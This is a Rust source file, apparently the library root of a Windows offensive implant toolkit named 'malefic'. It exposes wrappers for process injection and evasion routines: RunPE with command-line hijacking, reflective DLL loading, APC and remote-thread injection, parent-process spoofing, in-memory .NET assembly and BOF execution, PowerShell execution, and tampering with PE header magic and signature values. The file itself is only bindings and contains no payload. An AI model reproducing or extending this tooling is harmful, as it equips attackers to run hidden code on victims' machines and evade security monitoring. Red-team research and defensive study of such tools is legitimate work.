#![allow(dead_code)]
pub mod pe;
pub mod clr;
pub mod pwsh;
pub mod bof;
pub mod bypass;
pub mod func;
pub mod apis;

pub mod bindings;

// #[cfg(target_os = "windows")]
// #[cfg(feature = "prebuild")]
// #[link(name = "malefic_win_kit", kind = "static")]
// extern "C" {
//     pub fn ApcLoaderInline(
//         bin: *const u8,
//         bin_len: usize,
//         need_output: bool
//     ) -> RawString;
//     pub fn ApcLoaderSacriface(
//         bin: *const u8,
//         bin_len: usize,
//         sacrifice_commandline: *mut i8,
//         ppid: u32,
//         block_dll: bool,
//         need_output: bool
//     ) -> RawString;
//     pub fn InjectRemoteThread(
//         bin: *const u8,
//         bin_len: usize,
//         pid: u32
//     ) -> RawString;
//     pub fn MaleficLoadLibrary(
//         flags: u32,
//         buffer: *const u16,
//         file_buffer: *const core::ffi::c_void,
//         len: usize,
//         name: *const u8,
//     ) -> *const core::ffi::c_void;
//     pub fn MaleficGetFuncAddrWithModuleBaseDefault(
//         module_base: *const core::ffi::c_void,
//         func_name: *const u8,
//         func_name_len: usize,
//     ) -> *const core::ffi::c_void;
//     pub fn ReflectiveLoader(
//         start_commandline: *const u8,
//         start_commandline_len: usize,
//         reflective_loader_name: *const u8,
//         reflective_loader_name_len: usize,
//         data: *const u8,
//         data_len: usize,
//         param: *const u8,
//         param_len: usize,
//         ppid: u32,
//         block_dll: bool,
//         timeout: u32,
//         is_need_output: bool,
//     ) -> RawString;
//     pub fn InlinePE(
//         bin: *const u8,
//         bin_size: usize,
//         magic: *const u16,
//         signature: *const u32,
//         commandline: *const u8,
//         commandline_len: usize,
//         entrypoint: *const u8,
//         entrypoint_len: usize,
//         is_dll: bool,
//         is_need_output: bool,
//         timeout: u32,
//         delay: u32
//     ) -> RawString;
//     pub fn RunPE(
//         start_commandline: *const u8,
//         start_commandline_len: usize,
//         hijack_commandline: *const u8,
//         hijack_commandline_len: usize,
//         data: *const u8,
//         data_size: usize,
//         entrypoint: *const u8,
//         entrypoint_len: usize,
//         args: *const u8,
//         args_len: usize,
//         is_x86: bool,
//         pid: u32,
//         block_dll: bool,
//         need_output: bool
//     ) -> RawString;
//     pub fn RunSacrifice(
//         application_name: *mut u8,
//         start_commandline: *const u8,
//         start_commandline_len: usize,
//         hijack_commandline: *const u8,
//         hijack_commandline_len: usize,
//         parent_id: u32,
//         need_output: bool,
//         block_dll: bool
//     ) -> RawString;
//     pub fn MaleficExecAssembleInMemory(
//         data: *const u8,
//         data_len: usize,
//         args: *const *const u8,
//         args_len: usize,
//     ) -> RawString;
//     pub fn MaleficBofLoader(
//         buffer: *const u8,
//         buffer_len: usize,
//         arguments: *const *const u8,
//         arguments_size: usize,
//         entrypoint_name: *const u8,
//     ) -> RawString;
//     pub fn HijackCommandLine(
//         commandline: *const u8, 
//         commandline_len: usize
//     ) -> u8;
//     pub fn MaleficPwshExecCommand(
//         command: *const u8, 
//         command_len: usize
//     ) -> RawString;
//     pub fn PELoader(
//         handle: *const core::ffi::c_void,
//         base_addr: *const core::ffi::c_void,
//         size: usize,
//         need_modify_magic: bool,
//         need_modify_sign: bool,
//         magic: u16,
//         signature: u32
//     ) -> *const core::ffi::c_void;
//     pub fn UnloadPE(module: *const core::ffi::c_void);
//     pub fn MLoadLibraryA(
//         lpLibFileName: *const u8
//     ) -> *mut core::ffi::c_void;
//     pub fn MGetProcAddress(
//         module: *const core::ffi::c_void,
//         proc_name: *const u8
//     ) -> *const core::ffi::c_void;
//     pub fn MCreateThread(
//         thread_attributes: *mut core::ffi::c_void,
//         stack_size: u32,
//         start_address: *mut core::ffi::c_void,
//         parameter: *mut core::ffi::c_void,
//         creation_flags: u32,
//         thread_id: *mut u32,
//     ) -> *mut core::ffi::c_void;
//     pub fn MNtCreateThreadEx(
//         thread_handle: *mut core::ffi::c_void,
//         desired_access: u32,
//         object_attributes: *mut core::ffi::c_void,
//         process_handle: *mut core::ffi::c_void,
//         start_address: *mut core::ffi::c_void,
//         start_parameter: *mut core::ffi::c_void,
//         create_suspended: i32,
//         stack_zero_bits: u32,
//         size_of_stack_commit: u32,
//         size_of_stack_reserve: u32,
//         attribute_list: *mut core::ffi::c_void,
//     ) -> i32;
//     pub fn MGetCurrentProcess() -> *mut core::ffi::c_void;

//     pub fn MaleficMakePipe(
//         read: *mut *mut core::ffi::c_void, 
//         write: *mut *mut core::ffi::c_void) -> bool;
//     pub fn MaleficPipeRedirectStdOut(
//         write: *mut core::ffi::c_void
//     ) -> *const core::ffi::c_void;
//     pub fn MaleficPipeRepairedStdOut(stdout: *const core::ffi::c_void);
//     pub fn MaleficPipeRead(read_pipe: *mut core::ffi::c_void) -> *const u8;
//     pub fn SafeFreePipeData(data: *const u8);
// }

// #[cfg(target_os = "windows")]
// #[cfg(feature = "prebuild")]
// pub struct MaleficPipe {
//     read: *const core::ffi::c_void,
//     write: *const core::ffi::c_void,
// }


#[cfg(target_os = "windows")]
pub struct MaleficModule {
    pub new_module: *mut core::ffi::c_void,
    pub entry_point: *const core::ffi::c_void, 
    pub export_func: Vec<(String, usize)>,
}


// #[cfg(target_os = "windows")]
// #[cfg(feature = "prebuild")]
// pub struct DarkModule {
//     pub module_base: *const core::ffi::c_void,
// }

// #[cfg(target_os = "windows")]
// #[cfg(feature = "prebuild")]
// #[repr(C)]
// pub struct RawString {
//     pub data: *mut u8,
//     pub len: usize,
//     pub capacity: usize,
// }

#[cfg(target_os = "windows")]
#[cfg(feature = "prebuild")]
pub const LOAD_MEMORY: u16 = 0x02u16;
#[cfg(target_os = "windows")]
#[cfg(feature = "prebuild")]
pub const AUTO_RUN_DLL_MAIN: u32 = 0x00010000u32;

#[cfg(target_os = "windows")]
#[cfg(feature = "prebuild")]
pub fn pe_loader(
    handle: *const core::ffi::c_void,
    base_addr: *const core::ffi::c_void,
    size: usize,
    need_modify_magic: bool,
    need_modify_sign: bool,
    magic: u16,
    signature: u32,
) -> *const core::ffi::c_void {
    unsafe {
        bindings::PELoader(
            handle, 
            base_addr, 
            size, 
            need_modify_magic, 
            need_modify_sign, 
            magic, 
            signature
        )
    }
}

#[cfg(target_os = "windows")]
#[cfg(feature = "prebuild")]
pub fn unload_pe(
    module: *const core::ffi::c_void,
) {
    unsafe {
        bindings::UnloadPE(module)
    }
}

#[cfg(target_os = "windows")]
#[cfg(feature = "prebuild")]
pub fn load_library(
    flags: u32,
    buffer: *const u16,
    file_buffer: *const core::ffi::c_void,
    len: usize,
    name: *const u8,
) -> *const core::ffi::c_void {
    unsafe { bindings::MaleficLoadLibrary(flags, buffer, file_buffer, len, name) }
}

#[cfg(target_os = "windows")]
#[cfg(feature = "prebuild")]
pub fn run_pe(
    start_commandline: *const u8,
    start_commandline_len: usize,
    hijack_commandline: *const u8,
    hijack_commandline_len: usize,
    data: *const u8,
    data_size: usize,
    entrypoint: *const u8,
    entrypoint_len: usize,
    args: *const u8,
    args_len: usize,
    is_x86: bool,
    pid: u32,
    block_dll: bool,
    need_output: bool
) -> bindings::RawString {
    unsafe { 
        bindings::RunPE(
            start_commandline, 
            start_commandline_len,
            hijack_commandline,
            hijack_commandline_len,
            data,
            data_size,
            entrypoint,
            entrypoint_len,
            args,
            args_len,
            is_x86,
            pid,
            block_dll,
            need_output
        ) 
    }
}

#[cfg(target_os = "windows")]
#[cfg(feature = "prebuild")]
pub fn reflective_loader(
    start_commandline: *const u8,
    start_commandline_len: usize,
    reflective_loader_name: *const u8,
    reflective_loader_name_len: usize,
    data: *const u8,
    data_len: usize,
    param: *const u8,
    param_len: usize,
    ppid: u32,
    block_dll: bool,
    timeout: u32,
    is_need_output: bool,
) -> bindings::RawString {
    unsafe {
        bindings::ReflectiveLoader(
            start_commandline,
            start_commandline_len,
            reflective_loader_name,
            reflective_loader_name_len,
            data,
            data_len,
            param,
            param_len,
            ppid,
            block_dll,
            timeout,
            is_need_output
        )
    }
}

#[cfg(target_os = "windows")]
#[cfg(feature = "prebuild")]
pub fn inline_pe(
    bin: *const u8,
    bin_size: usize,
    magic: *const u16,
    signature: *const u32,
    commandline: *const u8,
    commandline_len: usize,
    entrypoint: *const u8,
    entrypoint_len: usize,
    is_dll: bool,
    is_need_output: bool,
    timeout: u32,
    delay: u32
) -> bindings::RawString {
    unsafe { bindings::InlinePE(bin, bin_size, magic, signature, commandline, commandline_len, entrypoint, entrypoint_len, is_dll, is_need_output, timeout, delay) }
}

#[cfg(target_os = "windows")]
#[cfg(feature = "prebuild")]
pub fn hijack_commandline(commandline: *const u8, commandline_len: usize) -> bool {
    unsafe { bindings::HijackCommandLine(commandline, commandline_len).ne(&0) }
}

#[cfg(target_os = "windows")]
#[cfg(feature = "prebuild")]
pub fn exec_assemble_in_memory(
    data: *const u8,
    data_len: usize,
    args: *const *const u8,
    args_len: usize,
) -> bindings::RawString {
    unsafe { bindings::MaleficExecAssembleInMemory(data, data_len, args, args_len) }
}

#[cfg(target_os = "windows")]
#[cfg(feature = "prebuild")]
pub fn bof_loader(
    buffer: *const u8,
    buffer_len: usize,
    arguments: *const *const u8,
    arguments_len: usize,
    entrypoint_name: *const u8,
) -> bindings::RawString {
    unsafe {
        bindings::MaleficBofLoader(
            buffer,
            buffer_len,
            arguments,
            arguments_len,
            entrypoint_name,
        )
    }
}

#[cfg(target_os = "windows")]
#[cfg(feature = "prebuild")]
pub fn pwsh_exec_command(command: *const u8, command_len: usize) -> bindings::RawString {
    unsafe { bindings::MaleficPwshExecCommand(command, command_len) }
}